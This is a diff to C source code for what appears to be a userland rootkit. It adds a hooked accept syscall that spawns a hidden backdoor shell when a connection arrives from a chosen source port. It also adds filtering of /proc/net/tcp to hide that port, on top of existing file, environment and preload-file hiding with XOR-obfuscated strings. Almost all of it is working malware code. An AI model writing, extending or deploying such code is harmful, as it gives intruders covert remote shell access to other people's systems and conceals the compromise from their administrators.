@@ -13,11 +13,14 @@
 #include <fnmatch.h>
 #include <signal.h>
 
+#include <sys/socket.h>   
+#include <netinet/in.h>
+#include <netdb.h>
+
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/mman.h>
-
 
 #define BUF_SIZE 8192
 #include "utils/clean.c"
@@ -31,6 +34,8 @@
 #include "stealth/hide_env.c"
 #include "stealth/install_rk.c"
 #include "stealth/hide_maps.c"
+#include "stealth/hide_ports.c"
+#include "backdoor/accept_backdoor.c"
 #include "rkconsts.h"
 
 typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);
@@ -104,6 +109,35 @@ static long rk_hook(
                 DEBUG_MSG("[!] Hiding file %s from access\n", path);
                 return -ENOENT;
             }
+            break;
+        }
+        case SYS_ACCEPT: {
+            // int accept(int fd, struct sockaddr __user * upeer_sockaddr, int __user * upeer_addrlen);
+            if (is_rk_user()) break;
+            DEBUG_MSG("[-] accept hooked!\n");
+            int sockfd = (int)rdi;
+            struct sockaddr * upeer_sockaddr = (struct sockaddr *)rsi;
+            int *upeer_addrlen = (int *)rdx;
+            int client_sockfd = syscall(SYS_ACCEPT, sockfd, upeer_sockaddr, upeer_addrlen);
+
+            struct sockaddr_in *addr_in = (struct sockaddr_in *)rsi;
+
+            DEBUG_MSG("[-] BACKDOOR: Got connection from: %s:%u\n",
+                inet_ntoa(addr_in->sin_addr),
+                ntohs(addr_in->sin_port)
+            );
+
+            if (ntohs(addr_in->sin_port) == HIDDEN_PORT) {
+                DEBUG_MSG("[-] Source port is backdoor port, launching shell\n");
+                if (fork() == 0) {
+                    accept_backdoor(client_sockfd);
+                }
+                else {
+                    close(client_sockfd);
+                    return -1;
+                }
+            }
+            DEBUG_MSG("[-] Source port is not backdoor port\n");
             break;
         }
         case SYS_EXECVE: {
@@ -349,7 +383,13 @@ static long rk_hook(
                 DEBUG_MSG("[!] Hiding from /proc/*/smaps\n");
                 return hide_smaps(path);
             }
-            
+            char *proc_net_tcp = strdup(PROC_NET_TCP); xor(proc_net_tcp);
+            if (!strcmp(path, proc_net_tcp)) {
+                DEBUG_MSG("[!] Hiding ports in /proc/net/tcp\n");
+                CLEAN(proc_net_tcp);
+                return hide_ports();
+            }
+            CLEAN(proc_net_tcp);
             char *ld = strdup(LD_SO_PRELOAD_PATH); xor(ld);
             if (!strcmp(path, ld)) {
                // TODO: Return backup if /etc/ld.so.preload already existed 
@@ -357,6 +397,7 @@ static long rk_hook(
                 CLEAN(ld);
                 return -ENOENT;
             }
+
             CLEAN(ld);
             break;
         }
